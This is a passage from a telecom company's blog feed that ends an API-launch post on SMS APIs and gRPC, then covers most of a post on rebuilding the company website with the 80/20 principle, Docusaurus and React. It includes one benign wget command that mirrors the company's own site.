operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"SE"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      </span><span class="token property">"name"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"Sweden"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Read the docs: <a href="https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-periodic-country-events.html" target="_blank" rel="noopener noreferrer">Get periodic country events</a></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="sms-apis">SMS APIs<a class="hash-link" href="#sms-apis" title="Direct link to heading">​</a></h4><p>We have also launched three SMS APIs, which will be covered more in depth in a later post:</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="send-text-sms-from-subscriber">Send text SMS from subscriber<a class="hash-link" href="#send-text-sms-from-subscriber" title="Direct link to heading">​</a></h5><p>This allows you to text messages from a subscriber to any phone number.</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="send-text-sms-to-subscriber">Send text SMS to subscriber<a class="hash-link" href="#send-text-sms-to-subscriber" title="Direct link to heading">​</a></h5><p>This allows a service to send regular text messages to a subscriber from either a phone number or an alphanumeric sender ID.</p><h5 class="anchor anchorWithStickyNavbar_LWe7" id="send-data-sms-to-subscriber">Send data SMS to subscriber<a class="hash-link" href="#send-data-sms-to-subscriber" title="Direct link to heading">​</a></h5><p>This allows a service to send binary messages to a subscriber from either a phone number or an alphanumeric sender ID.</p><p>This may be used to, for example, send APN settings when your subscribers swap phones.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="why-we-chose-grpc">Why we chose gRPC<a class="hash-link" href="#why-we-chose-grpc" title="Direct link to heading">​</a></h3><p>Using gRPC, our published proto-files are the contract for our APIs. This makes documentation easier, and makes it easy to ensure we don’t break our existing APIs.</p><p>Many of the APIs listed here are streaming APIs. In our experience gRPC makes implementing streams easy. We do also use protobufs a lot internally, and we have found that it helps us implement changes in a non-breaking way and has also aided us in making communication between services written in different languages work without too much hassle.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="our-api-playground">Our API playground<a class="hash-link" href="#our-api-playground" title="Direct link to heading">​</a></h3><p>A lot of our APIs are still in v0. The v0 APIs is our playground where we have been testing out what functionality we actually need, and how we can expose that in a way that is easy to use.</p><p>This includes APIs for receiving SMS, building WebRTC clients, setting up SIP integrations, and more.</p><p>For production usage, we do recommend that you stick to our released APIs as we may make breaking changes to our v0 APIs without any notice. You are however free to use them for demo purposes, and we would be very happy to receive feedback if there is anything you need to build your next product.</p><p>If you have any questions, feel free to reach out at <a href="mailto:products@wgtwo.com" target="_blank" rel="noopener noreferrer">products@wgtwo.com</a> and visit our docs website for a deeper dive and more code examples of the various APIs we provide: <a href="https://v1.docs.wgtwo.com/" target="_blank" rel="noopener noreferrer">https://v1.docs.wgtwo.com/</a>.</p>]]></content:encoded>
            <category>api</category>
        </item>
        <item>
            <title><![CDATA[How I leveraged the 80/20 principle to rebuild wgtwo.com]]></title>
            <link>https://www.wgtwo.com/jp/blog/new-website</link>
            <guid>new-website</guid>
            <pubDate>Fri, 25 Feb 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[For a company that provides an innovative solution across the telecommunication sector, I believe it is essential to have a web presence that effectively communicates our vision.]]></description>
            <content:encoded><![CDATA[<p>For a company that provides an innovative solution across the telecommunication sector, I believe it is essential to have a web presence that effectively communicates our vision.
This blog post illustrates my approach to taking the content of our existing website and transforming it into a completely new online presence, what it is today. This is the story of leveraging the Pareto 80/20 Principle to effectively portray <strong>wgtwo</strong> as the innovative telco brand it is.</p><center><b><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">wgtwo.com 2.0 =&gt; wgtwo.com 3.0</span></b></center><center><i>before and after</i></center><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/e819cd6dc15bd884621da80837d122d3.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/add086438dbb05d471599d4398b2d1aa.png" class="img_ev3q"></img-comparison-slider><h4 class="anchor anchorWithStickyNavbar_LWe7" id="background">Background<a class="hash-link" href="#background" title="Direct link to heading">​</a></h4><p>I recently <a href="https://open.spotify.com/episode/0MIeRQGAUcVW2qx2YrO7nn?si=c5d127ab6181434d" target="_blank" rel="noopener noreferrer">listened to a podcast</a> about a CEO making her biggest mistake - not promoting within her company. She was pressured into hiring an external CEO to fill her position while she could focus on leading the design initiatives. Long story short, this was her biggest mistake and she learned that promoting people from within the company leads to better results.</p><p>Outsourcing the design of our website, this podcast made it clear to me why it failed to show the true identity of <strong>wgtwo</strong>. What we needed was a clear storyline, dialogue, and understanding of the Insider to simplify and structure the content, giving the viewer an intuitive understanding. </p><p>At <strong>wgtwo</strong> we have a startup culture where we build initiatives from the ground up - self-doing and empowering the developer. The company promotes this concept on a semi-quarterly basis through hackdays - where we creatively solve complex problems and build new solutions for our telco core network or learn a new programming language.</p><p>Knowing the inner workings of our technology and services and having a hidden passion for creating websites I was in the perfect position to change reality. One day during a daily standup, the inner spark was lit and it was go time.</p><div class="theme-admonition theme-admonition-tip alert alert--success admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>Steps taken for building a new website</div><div class="admonitionContent_S0QG"><p>Step 1: setting the objectives<br>
<!-- -->Step 2: understand the 5 main issues of the wgtwo online presence<br>
<!-- -->Step 3: come up with strategies to solve<br>
<!-- -->Step 4: organize important content and design away - tell a story<br>
<!-- -->Step 5: code it up  </p></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-1-objectives">Step 1: Objectives<a class="hash-link" href="#step-1-objectives" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="8020-principle">80/20 Principle<a class="hash-link" href="#8020-principle" title="Direct link to heading">​</a></h3><p>Before diving into the nitty-gritty details of how I achieved to build a new website in a week, I wanted to briefly discuss the concept of the <a href="https://en.wikipedia.org/wiki/Pareto_principle" target="_blank" rel="noopener noreferrer">Pareto 80/20 Principle</a>. Essentially, if someone is not aware of the concept, it has been around for a while but in theory, is a concept that has been applied and proven by many economists. This principle can be applied to wealth, consumption, consequences, and most importantly output and results.</p><div class="theme-admonition theme-admonition-info alert alert--info admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>80/20 Principle High Level</div><div class="admonitionContent_S0QG"><p>❯ the majority, that has little impact<br>
<!-- -->❯ the small minority, that has a major, dominant impact </p><p>20% input = 80% output<br>
<!-- -->20% effort = 80% results</p><p>80% = Done</p></div></div><p>For the website, it was important to focus on, what is our 20% input. If a task comes to the table then it was important to know the importance of the task, and how much time should be spent on this. I will be referencing back to this 20% input and 80% output. For our context, 80% is a completed website.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="objectives">Objectives<a class="hash-link" href="#objectives" title="Direct link to heading">​</a></h3><p>I needed a mechanism to scope the amount of work and be able to "grade" the work at the end to ensure I meet my goal and most importantly, not get distracted from the goal. Part of the 80/20 principle is to ensure that 20% of the work is done to achieve 80% of the output. </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="primary-objectives-80">Primary objectives (80%)<a class="hash-link" href="#primary-objectives-80" title="Direct link to heading">​</a></h4><p>A website is used by an audience. It was important to understand the end-user so I can ensure that their experience was prioritized. After brainstorming I came up with two scenarios:</p><ul><li>Commercial: Convert potential customers from being interested in taking action</li><li>Talent: Inspire software engineers to consider <strong>wgtwo</strong> as their next employer and start engaging with us</li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="secondary-objectives"><em>Secondary objectives</em><a class="hash-link" href="#secondary-objectives" title="Direct link to heading">​</a></h4><p>As our secondary objectives, these were still always in the back of our head but in theory, had less of a priority. There was some overlap with the primary objectives. In the end, however, I was able to also include this as part of the 80% website offering as a lot of the written content previously existed on the old website.</p><ul><li>Third parties: Educate media, analysts, and third-party developers about the future of our industry and our offerings</li><li>Internal: Be an active platform for external knowledge sharing by employees (docs, policies, case studies, blogs, etc)</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="personas">Personas<a class="hash-link" href="#personas" title="Direct link to heading">​</a></h3><p>Ok sweet, so now that I have our <em>finite goal</em> in mind, let's think about the personas related to achieving our goals and objectives. Specifically, I found that it made sense to have two groups of personas, <em>external and internal</em>. </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="external-audience">External audience<a class="hash-link" href="#external-audience" title="Direct link to heading">​</a></h4><p>We can think about external audiences as who is using the website.</p><ul><li>I am a technical manager at MVNO company x trying to learn about how <strong>wgtwo</strong> solves business problems for me</li><li>I am a software engineer looking for a new challenge and job within the telco space</li><li>I am an existing customer of <strong>wgtwo</strong> finding documentation to APIs and contact details</li><li>I am an existing customer looking to find their security documentation</li><li>I work at a news outlet (journalist, analyst, investors) trying to find more information about <strong>wgtwo</strong></li></ul><blockquote><p>2 out of 5 were true with the old website</p></blockquote><p>Creating these statements allowed me to think about what content is important and the organizational architecture. This gave us the criteria to then grade our content for each bullet point.</p><p>As an example, focusing a lot of time on creating a storyline was critical for answering the questions around content organization on what business problems <strong>wgtwo</strong> solves, hiring and recruiting, and links to our external products like API Docs and support portals, as they did not exist before. </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="internal-audience">Internal audience<a class="hash-link" href="#internal-audience" title="Direct link to heading">​</a></h4><p>It was important to include internal personas as the website will be updated, maintained, and managed by whom, internal personas. Previously, the old wgtwo.com had a problem that the website was only updated by a select few in the sales team - but even then - an external request to a third-party company has to be made.</p><p>Who and how will <strong>wgtwo</strong> be updating the website. In short, everyone will have access to the website and be able to update content. </p><ul><li>I am an engineer looking to write a technical blog post in markdown</li><li>I am the head of marketing looking to post company news about a new feature <strong>wgtwo</strong> deployed</li><li>I am the head of marketing looking to update the header text on the homepage</li><li>I am an engineer looking to add a new link to the APIs doc</li><li>I am an engineer looking to add a new page about details of Voice</li><li>I am the CTO looking to update our tech page as I have a new capability</li><li>I am the CEO finding information about how I do XYZ for a sales chat</li><li>I am a salesperson looking to add a case study</li><li>I am a salesperson looking to find a link to more information to send to a customer </li></ul><blockquote><p>2 out of 9 were true with the old website</p></blockquote><p>Essentially, from these bullet-point lists above, I reflected and see that well I have a technical and non-technical persona that needs to be able to update the website. I need something modern and scalable to allow rich and modern web content while basic text blog posts and documentation. This was important when determining the tech stack for the website.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-234-problem-analysis-and-solution">Step 2,3,4: Problem Analysis and Solution<a class="hash-link" href="#step-234-problem-analysis-and-solution" title="Direct link to heading">​</a></h2><p>The bulk of the blog post will be this section. To help organize and communicate the problems, approach, and solution - there were a few domains that were clear to me that required work and altering. </p><p>Before tackling any problem listed before, it went through a process such as:</p><ol><li><strong>Problem</strong>: Identity what was not working with the old website and keep a total list</li><li><strong>Approach</strong>: Look back at the personas and objectives as mentioned earlier and come up with a definition of done (DoD)</li><li><strong>Solution</strong>: Have an ordered priority list of action items that must be done. It was important to review this list multiple times to ensure that one item on this list did not take more than 20% of the time compared to the other items. </li></ol><p>Ok, I am starting to get somewhere. Let's jump into some identified problem domains and see how I was able to achieve a cleaver solution and impact.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="storyline"><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Storyline</span><a class="hash-link" href="#storyline" title="Direct link to heading">​</a></h3><p><strong>Problem</strong>: Unclear message of what the <strong>wgtwo</strong> business is.<br>
<strong>Approach</strong>: Envisioning different personas (mvno employee, 3rd party developer, journalist, future <strong>wgtwo</strong> employee) trying to explain the business in different ways. Essentially, how can I build an elevator pitch for the website viewer?<br>
<strong>Solution</strong>: Restructuring the existing content on the website, and intuitively creating a hierarchy of content. I achieved this via a landing homepage that is made up of several components.<br>
<!-- -->(Example homepage: Intro, Vision, product, existing customers, case studies for future customers, action to get in touch) </p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Homepage - Landing Page</summary><div><div class="collapsibleContent_i85q"><div><div>The old homepage displayed on the left and new on the right. The homepage here took the most about of time to complete, as this is the key page for the website. <br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">What are we selling</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Mobile Core Network</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">No details on what the product is</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Added a section of Console</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">No information from existing customers</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Added a testimonial</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">No sense of credibility</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Logos with external links to business deals</span><br><br></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/a5f9e5f4886138957f5b98e57d64bec5.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/ecd44f720418d8ea9d16635807a4f12e.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Taking a page from Apple and Facebook</summary><div><div class="collapsibleContent_i85q"><div><div>When analyzing other websites, I noticed one similarity between them. Short descriptive text, with a <b>period</b>, and usage of <b>color</b>.</div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/4bf53c9c639dcbb2c6a0ab2adef35e04.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/f53dc99b80543f00bc843883cf3c8bf8.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><h3 class="anchor anchorWithStickyNavbar_LWe7" id="branding"><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Branding</span><a class="hash-link" href="#branding" title="Direct link to heading">​</a></h3><p><strong>Problem</strong>: No clear <strong>wgtwo</strong> identity, different brand names / no clear “slogan”<br>
<strong>Approach</strong>: Understand our personas, business model, and decide on a central way to communicate our brand // analysis of existing content to understand how the brand should be communicated<br>
<strong>Solution</strong>: Working Group Two AS = company name, while when referencing our company, <strong>wgtwo</strong> in bold - all lowercase to match our logo // programmable, scalable, innovative </p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>What's our company name?</summary><div><div class="collapsibleContent_i85q"><div><div>The old website had five different ways of writing our company name. 5. If we can't even get it right, how could someone else? Let's start and create a new standard for our name - as shown below!<br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">Working Group 2</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Working Group Two AS</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">Working Group 2 As</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Working Group Two AS</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">WorkingGroup2</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Working Group Two AS</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">WGTWO</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">wgtwo</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">WG2</span> =&gt; <br><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">wgtwo</span><br><br></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/5e6f31d240240f061d5a652341c56687.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/062f01bb4b6d1f7e15fe46039aeaf609.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Word analysis</summary><div><div class="collapsibleContent_i85q"><div><div>Surprisingly, website 2.0 had some great text. A lot of work was spent to build content about the mobile core network space. From a statistically point of view, I wanted to try to analyze what words were most frequent across the website to get an idea of what words we should focus on as part of the homepage hero header text.<br><br>To achieve this, I had to run a script to download the HTML of the website, as we did not even own the source code of the website. Below you can see the small script I ran to recursively download all pages from the old website. From some small grepping, I found our that <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">innovation</span> was one of the top lists.<br><br><code>wget --recursive --page-requisites --adjust-extension --span-hosts --convert-links --restrict-file-names=windows --domains wgtwo.com --no-parent wgtwo.com</code></div><br><img loading="lazy" src="/jp/58276d57bb76229a47f811425c40e855.png" class="img_ev3q"><br></div></div></div></details><h3 class="anchor anchorWithStickyNavbar_LWe7" id="content-organization"><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Content organization</span><a class="hash-link" href="#content-organization" title="Direct link to heading">​</a></h3><p><strong>Problem</strong>: Hidden content (too long paths)<br>
<strong>Approach</strong>: <a href="https://www.mirco.com" target="_blank" rel="noopener noreferrer">Miro</a> board chart to understand the existing website structure and content<br>
<strong>Solution</strong>: everything accessible via <ins>one click</ins>, make more use out of the header and footer of the page
(Example: find the interview process page) </p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Mapping the website structure with Miro</summary><div><div class="collapsibleContent_i85q"><div><div>The goal of the new website was to make everything accessible from one click from the home page. If this meant a link in the footer, or a call to action within a component. It should be super clear as the viewer to understand where they are when navigating on the website.<br><br>This was a time consuming process to map out the structure of the old website but in doing so, it was / is quite clear that the new website has a huge improvement in readability.<br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">27 pages</span> =&gt; <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">8 pages</span></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/6986e046d4438ceaf04c0350ea8296a0.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/76ac485b029953e89637d93ab5cfb0d6.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Product Ecosystem</summary><div><div class="collapsibleContent_i85q"><div><div>Analyzing the old website, I realized that the product ecosystem consisted of 5 pages with various dead-end links going to various other pages. This made it really difficult for even myself (someone who already knows the product), what was trying to be communicated. I was able to use a dialog box with bullet points to describe the two products in a clever way that can be viewed on just a single page.<br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">5 pages</span> =&gt; <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">1 page</span></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/572e8fb3a8fa476cbac1f2bdb86a8dd6.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/9c0cce90a796bd13400700191056da90.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><h3 class="anchor anchorWithStickyNavbar_LWe7" id="user-experience"><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">User Experience</span><a class="hash-link" href="#user-experience" title="Direct link to heading">​</a></h3><p><strong>Problem</strong>: Difficult to read text, website nonresponsive, outdated, not techy<br>
<strong>Approach</strong>: Adopt a modern scalable framework using React, Typescript, Docusourus. Thoroughly test the site on desktop and mobile when developing.<br>
<strong>Solution</strong>: no images only text-based site, clear structure of header/subtitles/text, mobile-friendly, and brand messaging! </p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Shutterstock images to graphical text</summary><div><div class="collapsibleContent_i85q"><div><div>Rather than filling a page with default, free, standard images from shutterstock.com, I spent the time to fill a page with meaning messaging where the viewer can learn about <b>wgtwo</b>.<br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">Shutterstock images</span> =&gt; <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Crafted messaging</span></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/8a36be75e6b580204a27ac4a8a05cb3b.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/84524c045ee1e44f2be8f3d68741c1e6.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Mobile Friendliness</summary><div><div class="collapsibleContent_i85q"><div><div>My vision is that every single landing page is mobile-friendly with the sense that heading and supporting text can be read on one screen. The size of the font. A known formula to help calculate the font size, take the user's age, divide by two, and that is the font size. E.g. <ins>60 age / 2 = 30px</ins><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">Non-descriptive headers</span> =&gt; <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Product we are selling</span></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/7930138e9f8c6a77a847fc0a9ff34e53.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/2561aeed0d6990146e3bf8d608570653.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Interview process</summary><div><div class="collapsibleContent_i85q"><div><div>One of the primary goals for the new website was hiring. You can see on website 2.0 there is a terrible empty white space. We asked the previous website owner to fix this and after a month no fix. The new website career page has an interactive element where the culture text will scroll down as the reader explores the different interview phases.<br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">A weird empty white space</span> =&gt; <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Interactive elements</span></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/cd7485d288ab652d95d51c42f9c159c0.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/75c1d2ff3009714066f19491e96b10e2.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><h3 class="anchor anchorWithStickyNavbar_LWe7" id="operational"><span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">Operational</span><a class="hash-link" href="#operational" title="Direct link to heading">​</a></h3><p><strong>Problem</strong>: Few internal people and externals can update the site, hosted on WordPress, managed by externals<br>
<strong>Approach</strong>: Understand user personas for the website to ensure all internal users can make updates / give people in the company the ability to work on the website/ inspire to be proactive in making blog posts again / create an identity within the company (every tech company should own their tech)<br>
<strong>Solution</strong>: Public git repo, markdown, education material in updating the site, a framework to inspire to create content
(Example: blog, docs) </p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Goodbye Wordpress, Hello React</summary><div><div class="collapsibleContent_i85q"><div><div>The old website was built leveraging Wordpress. To make any changes to this website, we had to send an email, wait a week, pay money, and wait. This process of improving the site was impossible. Now we have everything hosted in Github where anyone can create a pull request and apply a change. <br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">7 days</span> =&gt; <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">5 minutes</span><br><br><span style="background-color:#ef507f;border-radius:4px;color:#fff;padding:0.2rem">$$$$</span> =&gt; <span style="background-color:#000;border-radius:4px;color:#fff;padding:0.2rem">0</span></div><br><img-comparison-slider class="slider" tabindex="0" hover="hover"><img loading="lazy" slot="first" src="/jp/96d3a43a6c4c2592d980770d344a3b5b.png" class="img_ev3q"><img loading="lazy" slot="second" src="/jp/8d2a90cbb7a6803b4504e148992cc1c7.png" class="img_ev3q"></img-comparison-slider><br></div></div></div></details><h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-5-the-tech">Step 5: The tech<a class="hash-link" href="#step-5-the-tech" title="Direct link to heading">​</a></h2><p>As mentioned in the Internal audience, I needed to cater to personas inside our company that were both technical and non-technical. I had use-cases where I wanted something that could be self-managed and hosted low maintenance and was a modern and scalable workflow.</p><ul><li>The non-techy staff and blog posts such as this, the industry-standard now days is markdown. So I knew I needed markdown.</li><li>For the techy to make a website that could be customizable, secure, scale, and use APIs - react is also an industry standard. In addition, I wanted something that generated just plain HTML so I could host on GitHub without an issue.</li></ul><div class="theme-admonition theme-admonition-tip alert alert--success admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>The tech</div><div class="admonitionContent_S0QG"><ul><li>React/Typescript - Scalable modern framework that allows for complex API calls. For example, it came in handy for creating our <a href="/jp/careers/">Careers Page</a></li><li><a href="https://docusaurus.io" target="_blank" rel="noopener noreferrer">https://docusaurus.io</a> - native support for markdown allowing for a rich blog (which is what you are reading today!)</li><li>Github and GH Actions for hosting, building, and collaborating</li></ul></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="lessons-learned">Lessons learned<a class="hash-link" href="#lessons-learned" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-went-well">What went well<a class="hash-link" href="#what-went-well" title="Direct link to heading">​</a></h3><ul><li>80/20 model was critical to get progress made in a week.</li><li>Scoping the project with a defined time (1 week) helped. I scoped it in several ways such as focusing what links to include in the header and footer, as well as, keeping the original text as much as possible from the previous website. </li><li>Keeping this initiative small. The fewer people, the faster one can move and make decisions and get stuff done.</li><li>Accepting that a website is never complete and focus on getting something out of the door.</li><li>Using React with live reload was a breeze for quickly testing and demoing out new component designs</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-bad">The bad<a class="hash-link" href="#the-bad" title="Direct link to heading">​</a></h3><ul><li>Don't waste time on illustrations. Illustrations are tricky because it is a love/hate relationship. Some will love, and others will dislike - and seldom a full agreement. Crafting good text will tell a better story than a cheap illustration that people remember. All in all, I probably wasted 5 hours trying to come up with solutions and doing research that ended with the original text I had in about 5 minutes of thinking.</li><li>Handling a company-wide iniative, several people have opinions in how things can be best done. This critique and push back can be hard for some people but I never let this get to me mentally and instead followed my gut and kept pushing forward. </li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-i-learned">What I learned<a class="hash-link" href="#what-i-learned" title="Direct link to heading">​</a></h3><ul><li>I learned a new framework and language - React, Typescript, Docusaurus</li><li>I learned about modern website design concepts</li><li>I learned how Github actions work</li><li>I learned how to better prioritize my time</li><li>I learned the importance of following your gut and doing what I am passionate about</li><li>I learned how hard illustrations are</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="today">Today<a class="hash-link" href="#today" title="Direct link to heading">​</a></h2><p>After the week was up, it was time to present this new website in our company-wide Friday demos. After a short 15 minute walkthrough, the excitement I bottled up has now 